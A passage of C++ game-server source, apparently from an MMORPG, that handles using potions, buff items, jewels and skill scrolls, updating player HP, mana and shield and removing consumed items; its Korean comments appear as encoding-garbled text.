#ifdef USE_PREV_HP_POTION
			if( gObj[aIndex].FillLife > 0.f )
			{
				gObj[aIndex].Life += gObj[aIndex].FillLife;
				if( gObj[aIndex].Life > (gObj[aIndex].MaxLife+gObj[aIndex].AddLife) ) 
				{
					gObj[aIndex].Life = (gObj[aIndex].MaxLife+gObj[aIndex].AddLife);
					gObj[aIndex].FillLife = 0;	// �ѹ� �� ä������ ������.
				}
#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(gObj[aIndex].m_Index, (WORD)gObj[aIndex].Life, 0xFF, 0, (WORD)gObj[aIndex].iShield);
#else
				GCReFillSend(gObj[aIndex].m_Index, (WORD)gObj[aIndex].Life, 0xFF, 0);
#endif
			}
#endif		
			gObj[aIndex].FillLifeMax = (float)tLife;
			gObj[aIndex].FillLife	 = (float)tLife;


#ifndef IMMEDIATELY_HP_MP_AG_RECUPERATION_20050614
	#ifdef ADD_HP_POTION_LEVEL1_20040401
				// ���� ������ 1�� ��� ���� Ƚ�� 2��
				if( citem->m_Level == 1 )
					gObj[aIndex].FillLifeCount = 2;
				else
					gObj[aIndex].FillLifeCount = 3;
	#endif
#endif

#ifdef IMMEDIATELY_HP_MP_AG_RECUPERATION_20050614
			if( citem->m_Type == MAKE_ITEMNUM(14,0) && citem->m_Level < 2) {
				gObj[aIndex].FillLifeCount = 0;
			}
			else {
				if( citem->m_Level == 1 )
					gObj[aIndex].FillLifeCount = 2;
				else
					gObj[aIndex].FillLifeCount = 3;
			} 
#endif

#ifdef ADD_EFFECT_POTION_20040401
			GCSendEffectInfo( aIndex, EFFECT_POTION_HP );
#endif
			
			//gObj[aIndex].Life     += tLife;
			//if( gObj[aIndex].Life > gObj[aIndex].MaxLife-1 ) gObj[aIndex].Life = gObj[aIndex].MaxLife;
			
			//GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, pos, 1);
			//LogAdd("%s(%d) ���� ��� : %d %f %f %f", gObj[aIndex].Name, aIndex, tLife, gObj[aIndex].MaxLife, gObj[aIndex].FillLifeMax, gObj[aIndex].FillLife);
			
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if( citem->m_Type == MAKE_ITEMNUM(14,4) || 
				 citem->m_Type == MAKE_ITEMNUM(14,5) || 
				 citem->m_Type == MAKE_ITEMNUM(14,6) )

		{
			int tMana = citem->m_Value*10-(gObj[aIndex].Level);
			if( tMana < 0 ) tMana = 0;
			switch(citem->m_Type)
			{
			case MAKE_ITEMNUM2(14,4):
				tMana += (int)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana)*g_GlobalConfig.m_iSmallMP_Potion/100;
				break;
			case MAKE_ITEMNUM2(14,5):
				tMana += (int)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana)*g_GlobalConfig.m_iMediumMP_Potion/100;
				break;
			case MAKE_ITEMNUM2(14,6):
				tMana += (int)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana)*g_GlobalConfig.m_iLargeMP_Potion/100;
				break;
			}
			gObj[aIndex].Mana += tMana;
			if( gObj[aIndex].Mana > (gObj[aIndex].MaxMana+gObj[aIndex].AddMana)-1 ) gObj[aIndex].Mana = (gObj[aIndex].MaxMana+gObj[aIndex].AddMana);

#ifdef NEW_FORSKYLAND2
			GCManaSend(gObj[aIndex].m_Index, (short)gObj[aIndex].Mana, 0xFF, 0, gObj[aIndex].BP);
#else
			GCManaSend(gObj[aIndex].m_Index, (short)gObj[aIndex].Mana, 0xFF, 0, 0);
#endif

#ifdef ADD_EFFECT_POTION_20040401
			//GCSendEffectInfo( aIndex, EFFECT_POTION_MP );
#endif

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

		}

#ifdef ADD_SHIELD_POINT_01_20060403
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 38 ) ) // ���� ���չ���
		{
			// CODEREVIEW_SHIELD : iAddShield �߰�, iAddLife �߰�
			int iShieldGage = ( ( gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield ) * 5 / 100 );
			int iHPGage = ( ( gObj[aIndex].MaxLife+gObj[aIndex].AddLife ) * 10 / 100 );

			if( gObj[aIndex].iShield < 0 )
			{
				gObj[aIndex].iShield = 0;
			}

			if( gObj[aIndex].FillLife > 0 )
			{
				gObj[aIndex].Life = gObj[aIndex].Life + gObj[aIndex].FillLife;
				if( gObj[aIndex].Life > ( gObj[aIndex].MaxLife + gObj[aIndex].AddLife ) )
				{
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
				}
			}

			// CODEREVIEW_SHIELD : Max �� ��
			if( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield = gObj[aIndex].iShield + gObj[aIndex].iFillShield;
				if( gObj[aIndex].iShield > ( gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
				{
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
				}
			}

			gObj[aIndex].FillLife			= iHPGage;
			gObj[aIndex].FillLifeMax		= iHPGage;
			gObj[aIndex].FillLifeCount		= 4;
			gObj[aIndex].iFillShield		= iShieldGage;
			gObj[aIndex].iFillShieldMax		= iShieldGage;
			gObj[aIndex].iFillShieldCount	= 4;

			// ���� �Դ� ����Ʈ ��� (�Լ��� ����)
			GCSendEffectInfo( aIndex, EFFECT_POTION_SD );

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			
	#ifdef EXTEND_LOG_SYSTEM_02_20060516
			LogAddTD("[%s][%s]Use Compound Potion Lv1 - SD[%d] HP[%f] -> SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name,
				gObj[aIndex].iShield, gObj[aIndex].Life,
				gObj[aIndex].iShield+iShieldGage, gObj[aIndex].Life+iHPGage);
	#endif
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 39 ) ) // �߰� ���չ���
		{
			int iShieldGage = ( ( gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield ) * 10 / 100 );
			int iHPGage = ( ( gObj[aIndex].MaxLife+gObj[aIndex].AddLife ) * 25 / 100 );

			if( gObj[aIndex].iShield < 0 )
			{
				gObj[aIndex].iShield = 0;
			}

			if( gObj[aIndex].FillLife > 0 )
			{
				gObj[aIndex].Life = gObj[aIndex].Life + gObj[aIndex].FillLife;
				if( gObj[aIndex].Life > ( gObj[aIndex].MaxLife + gObj[aIndex].AddLife ) )
				{
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
				}
			}

			if( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield = gObj[aIndex].iShield + gObj[aIndex].iFillShield;
				if( gObj[aIndex].iShield > ( gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
				{
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
				}
			}

			gObj[aIndex].FillLife = iHPGage;
			gObj[aIndex].FillLifeMax = iHPGage;
			gObj[aIndex].FillLifeCount = 4;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;
			gObj[aIndex].iFillShieldCount = 4;

			// ���� �Դ� ����Ʈ ��� (�Լ��� ����)
			GCSendEffectInfo( aIndex, EFFECT_POTION_SD );
			
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
	#ifdef EXTEND_LOG_SYSTEM_02_20060516
			LogAddTD("[%s][%s]Use Compound Potion Lv2 - SD[%d] HP[%f] -> SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name,
				gObj[aIndex].iShield, gObj[aIndex].Life,
				gObj[aIndex].iShield+iShieldGage, gObj[aIndex].Life+iHPGage);
	#endif
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 40 ) ) // ū ���չ���
		{
			int iShieldGage = ( ( gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield ) * 20 / 100 );
			int iHPGage = ( ( gObj[aIndex].MaxLife+gObj[aIndex].AddLife ) * 45 / 100 );

			if( gObj[aIndex].iShield < 0 )
			{
				gObj[aIndex].iShield = 0;
			}

			if( gObj[aIndex].FillLife > 0 )
			{
				gObj[aIndex].Life = gObj[aIndex].Life + gObj[aIndex].FillLife;
				if( gObj[aIndex].Life > ( gObj[aIndex].MaxLife + gObj[aIndex].AddLife ) )
				{
					gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
				}
			}

			if( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield = gObj[aIndex].iShield + gObj[aIndex].iFillShield;
				if( gObj[aIndex].iShield > ( gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
				{
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
				}
			}

			gObj[aIndex].FillLife = iHPGage;
			gObj[aIndex].FillLifeMax = iHPGage;
			gObj[aIndex].FillLifeCount = 4;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;
			gObj[aIndex].iFillShieldCount = 4;


			// ���� �Դ� ����Ʈ ��� (�Լ��� ����)
			GCSendEffectInfo( aIndex, EFFECT_POTION_SD );
			
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

	#ifdef EXTEND_LOG_SYSTEM_02_20060516
			LogAddTD("[%s][%s]Use Compound Potion Lv3 - SD[%d] HP[%f] -> SD[%d] HP[%f]",
				gObj[aIndex].AccountID, gObj[aIndex].Name,
				gObj[aIndex].iShield, gObj[aIndex].Life,
				gObj[aIndex].iShield+iShieldGage, gObj[aIndex].Life+iHPGage);
	#endif

		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 35 ) ) // ���� SDȸ�� ���� ���
		{
			int iShieldGage = ( ( gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield ) * 25 / 100 );

			if( gObj[aIndex].iShield < 0 )
			{
				gObj[aIndex].iShield = 0;
			}

			if( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield = gObj[aIndex].iShield + gObj[aIndex].iFillShield;
				if( gObj[aIndex].iShield > ( gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
				{
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
				}
			}

			gObj[aIndex].iFillShieldCount = 2;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;

			// ���� �Դ� ����Ʈ ��� (�Լ��� ����)
			GCSendEffectInfo( aIndex, EFFECT_POTION_SD );

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 36 ) ) // �߰� SD ȸ������
		{
			int iShieldGage = ( ( gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield ) * 35 / 100 );

			if( gObj[aIndex].iShield < 0 )
			{
				gObj[aIndex].iShield = 0;
			}

			if( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield = gObj[aIndex].iShield + gObj[aIndex].iFillShield;
				if( gObj[aIndex].iShield > ( gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
				{
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
				}
			}

			gObj[aIndex].iFillShieldCount = 2;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;

			// ���� �Դ� ����Ʈ ��� (�Լ��� ����)
			GCSendEffectInfo( aIndex, EFFECT_POTION_SD );

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 37 ) ) // ū SD ȸ������
		{
			int iShieldGage = ( ( gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield ) * 45 / 100 );

			if( gObj[aIndex].iShield < 0 )
			{
				gObj[aIndex].iShield = 0;
			}

			if( gObj[aIndex].iFillShield > 0 )
			{
				gObj[aIndex].iShield = gObj[aIndex].iShield + gObj[aIndex].iFillShield;
				if( gObj[aIndex].iShield > ( gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield ) )
				{
					gObj[aIndex].iShield = gObj[aIndex].iMaxShield + gObj[aIndex].iAddShield;
				}
			}

			gObj[aIndex].iFillShieldCount = 2;
			gObj[aIndex].iFillShield = iShieldGage;
			gObj[aIndex].iFillShieldMax = iShieldGage;

			// ���� �Դ� ����Ʈ ��� (�Լ��� ����)
			GCSendEffectInfo( aIndex, EFFECT_POTION_SD );

			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
#endif
		else if( citem->m_Type == MAKE_ITEMNUM(14,8) )	// ȸ������ ���
		{
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			if( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_POISON ) == true )
			{
				gObjRemoveBuffEffect( &gObj[aIndex], BUFFTYPE_POISON );
				gObj[aIndex].lpAttackObj = NULL;
				GCMagicCancelSend(&gObj[aIndex], AT_SKILL_POISON);
			}
			else if( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_FREEZE ) == true )
			{
				gObjRemoveBuffEffect( &gObj[aIndex], BUFFTYPE_FREEZE );
				gObj[aIndex].DelayActionTime	= 0;
				gObj[aIndex].DelayLevel			= 0;
				gObj[aIndex].lpAttackObj		= NULL;
				GCMagicCancelSend(&gObj[aIndex], AT_SKILL_SLOW);
			}
#else
			if( gObj[aIndex].m_PoisonBeattackCount ) 
			{
#ifdef ADD_SKILL_WITH_COMBO
				gObj[aIndex].m_PoisonType = 0;
#endif
				gObj[aIndex].m_PoisonBeattackCount	= 0;
				gObj[aIndex].lpAttackObj			= NULL;
				GCMagicCancelSend(&gObj[aIndex], AT_SKILL_POISON);
			}
			if( gObj[aIndex].m_ColdBeattackCount) 
			{
				gObj[aIndex].m_ColdBeattackCount= 0;
				gObj[aIndex].DelayActionTime	= 0;
				gObj[aIndex].DelayLevel			= 0;
				gObj[aIndex].lpAttackObj		= NULL;
				GCMagicCancelSend(&gObj[aIndex], AT_SKILL_SLOW);
			}
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
		}

#ifdef ITEM_ADD_OPTION_20061019
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 46 ) )		// �� �� ������ �ູ (���� ���)
		{
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}

#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			gObjAddBuffEffect( &gObj[aIndex], BUFFTYPE_HALLOWEEN_BLESS );
#else
			g_ItemAddOption.SetItemEffect( &gObj[aIndex], MAKE_ITEMNUM( 14, 46 ) );
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifndef MODIFY_JOL_BLESS_POTION_USE_EFFECT_20061030
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0, (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield));
#else
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0);
#endif
			GCManaSend( aIndex, (short)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana), 0xFE, 0, gObj[aIndex].MaxBP+gObj[aIndex].AddBP);		
#endif	
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 47 ) )		// �� �� ������ �г� (���ݷ� ���)
		{
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}

#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			gObjAddBuffEffect( &gObj[aIndex], BUFFTYPE_HALLOWEEN_ANGER );
#else
			g_ItemAddOption.SetItemEffect( &gObj[aIndex], MAKE_ITEMNUM( 14, 47 ) );
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifndef MODIFY_JOL_BLESS_POTION_USE_EFFECT_20061030
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0, (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield));
#else
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0);
#endif
			GCManaSend( aIndex, (short)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana), 0xFE, 0, gObj[aIndex].MaxBP+gObj[aIndex].AddBP);		
#endif	
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 48 ) )		// �� �� ������ ��ħ (���� ���)
		{
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}

#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			gObjAddBuffEffect( &gObj[aIndex], BUFFTYPE_HALLOWEEN_CRY );
#else
			g_ItemAddOption.SetItemEffect( &gObj[aIndex], MAKE_ITEMNUM( 14, 48 ) );
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifndef MODIFY_JOL_BLESS_POTION_USE_EFFECT_20061030
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0, (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield));
#else
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0);
#endif
			GCManaSend( aIndex, (short)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana), 0xFE, 0, gObj[aIndex].MaxBP+gObj[aIndex].AddBP);		
#endif	
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 49 ) )		// �� �� ������ ���� (�ִ� HP���)
		{
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}

#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			gObjAddBuffEffect( &gObj[aIndex], BUFFTYPE_HALLOWEEN_FOOD );
#else
			g_ItemAddOption.SetItemEffect( &gObj[aIndex], MAKE_ITEMNUM( 14, 49 ) );
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifndef MODIFY_JOL_BLESS_POTION_USE_EFFECT_20061030
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0, (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield));
#else
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0);
#endif
			GCManaSend( aIndex, (short)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana), 0xFE, 0, gObj[aIndex].MaxBP+gObj[aIndex].AddBP);		
#endif	
		}
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 50 ) )		// �� �� ������ ���� (�ִ� MP���)
		{
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1 ) == FALSE )
			{
				gObjInventoryItemSet( aIndex, pos, 0xFF );
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend( aIndex, pos, 1 );
			}

#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
			gObjAddBuffEffect( &gObj[aIndex], BUFFTYPE_HALLOWEEN_DRINK );
#else
			g_ItemAddOption.SetItemEffect( &gObj[aIndex], MAKE_ITEMNUM( 14, 50 ) );
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifndef MODIFY_JOL_BLESS_POTION_USE_EFFECT_20061030
#ifdef ADD_SHIELD_POINT_01_20060403
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0, (WORD)(gObj[aIndex].iMaxShield+gObj[aIndex].iAddShield));
#else
			GCReFillSend( aIndex, (WORD)(gObj[aIndex].MaxLife + gObj[aIndex].AddLife), 0xFE, 0);
#endif
			GCManaSend( aIndex, (short)(gObj[aIndex].MaxMana+gObj[aIndex].AddMana), 0xFE, 0, gObj[aIndex].MaxBP+gObj[aIndex].AddBP);		
#endif	
		}
#endif // ITEM_ADD_OPTION_20061019

#ifdef ADD_PCS_FULL_RECOVERY_POTION_20070508
		else if( citem->m_Type == MAKE_ITEMNUM( 14, 63 )
			|| citem->m_Type == MAKE_ITEMNUM( 14, 64 )
			   )
		{
			// 1. ����� ������ ������ ���� HP�� Mana�� ä���ش�
			// 1-2. ������� HP�� ������ �����Ѵ�
			switch( citem->m_Type )
			{
			case MAKE_ITEMNUM2( 14, 63 ):
				gObj[aIndex].Life = gObj[aIndex].MaxLife + gObj[aIndex].AddLife;
				GCReFillSend( aIndex, (WORD)(gObj[aIndex].Life), 0xFF, 0, (WORD)(gObj[aIndex].iShield) );
				break;
			case MAKE_ITEMNUM2( 14, 64 ):
				gObj[aIndex].Mana = gObj[aIndex].MaxMana + gObj[aIndex].AddMana;
				GCManaSend( aIndex, (WORD)(gObj[aIndex].Mana), 0xFF, 0, gObj[aIndex].BP );
				break;
			}

			// 3. ����� �������� �����Ͽ� �ش�.
			if( gObjSearchItemMinus( &gObj[aIndex], pos, 1) == FALSE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
#endif // ADD_PCS_FULL_RECOVERY_POTION_20070508

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530	
		// ��ȭ�Ǻ��� ��ȭ �ý���
		else if ( g_kJewelOfHarmonySystem.IsJewelOfHarmonyPurity(citem->m_Type) == TRUE		// ��ȭ�Ǻ���(������) �ΰ�� ó��
	#ifdef MODIFY_ITEM_SOCKET_OPTION_BUGFIX_03_20080704
			&& ( g_SocketOptionSystem.IsSocketItem( &gObj[aIndex].pInventory[lpMsg->invenrotyTarget] ) == false )	// ���� �������� ��� ���� �ɼ� ���� �Ұ�
	#endif // MODIFY_ITEM_SOCKET_OPTION_BUGFIX_03_20080704
			)
		{
			if ( g_kJewelOfHarmonySystem.StrengthenItemByJewelOfHarmony(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE ) 
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			else
			{
				// �����Ѱ��. �Ʒ� ���� ������� �ϴ� �� ����.
		#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
		#endif
			}
		}
		// ���ü� ��ȭ �ý��� : ���/�ϱ� ���ü�
		else if ( g_kJewelOfHarmonySystem.IsJewelOfHarmonySmeltingItems(citem->m_Type) == TRUE ) // ���/�ϱ� ���ü��� ��� ó��
		{
			if ( g_kJewelOfHarmonySystem.SmeltItemBySmeltingStone(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE ) 
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			else
			{
				// �����Ѱ��. �Ʒ� ���� ������� �ϴ� �� ����.
#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#endif
			}
		}
#endif //ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
		else if( citem->m_Type == MAKE_ITEMNUM(14,13) )	// �ູ�Ǻ���
		{
			if( gObjItemLevelUp(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}			
		}
		else if( citem->m_Type == MAKE_ITEMNUM(14,14) )	// ��ȥ�Ǻ���
		{			
			if( gObjItemRandomLevelUp(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if( citem->m_Type == MAKE_ITEMNUM(14,16) )	// ������ ����
		{	
			if( gObjItemRandomOption3Up(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, 0xFF);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			else 
			{
#ifdef ADD_SHIELD_POINT_01_20060403
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1, (WORD)gObj[aIndex].iShield);
#else
				GCReFillSend(aIndex, (WORD)gObj[aIndex].Life, 0xFD, 1);
#endif
			}
		}
		else if( (citem->m_Type >= MAKE_ITEMNUM(15,0)) ||  // ���� ������ �̶��
                 (citem->m_Type == MAKE_ITEMNUM(12,7)) ||  // ȸ���� ���� ���� ������

#ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601	// ���̾� ��ũ�� ��ũ�� ���
				 ( (citem->m_Type >= MAKE_ITEMNUM(12,8) ) && (citem->m_Type <= MAKE_ITEMNUM(12,24)) )
				|| ( citem->m_Type == MAKE_ITEMNUM( 12, 35 ) )	// ���̾ũ�� ��ũ��
#else	// #ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
	#ifdef DARKLORD_WORK
					 ( (citem->m_Type >= MAKE_ITEMNUM(12,8) ) && (citem->m_Type <= MAKE_ITEMNUM(12,24)) )
	#else
					 ( (citem->m_Type >= MAKE_ITEMNUM(12,8) ) && (citem->m_Type <= MAKE_ITEMNUM(12,21)) )
	#endif  // #ifdef DARKLORD_WORK
#endif	// #ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
#ifdef ADD_SEASON4_NEW_SKILL_20080522	// �űԽ�ų ���� �߰�
					 || ( citem->m_Type == MAKE_ITEMNUM( 12, 44 ) )	// �ı��� �ϰ� ����
					 || ( citem->m_Type == MAKE_ITEMNUM( 12, 45 ) )	// ��Ƽ�� ����
					 || ( citem->m_Type == MAKE_ITEMNUM( 12, 46 ) )	// ȸ�� ����
					 || ( citem->m_Type == MAKE_ITEMNUM( 12, 47 ) )	// �÷��� ��Ʈ����ũ ����
					 || ( citem->m_Type == MAKE_ITEMNUM( 12, 48 ) )	// ī��ƽ ���̾� ��ũ��
#endif	// ADD_SEASON4_NEW_SKILL_20080522
				 )	// ���� ������ �̶��
		{
#ifdef NEW_FORSKYLAND2
			if( gObj[aIndex].Strength+gObj[aIndex].AddStrength < citem->m_RequireStrength )
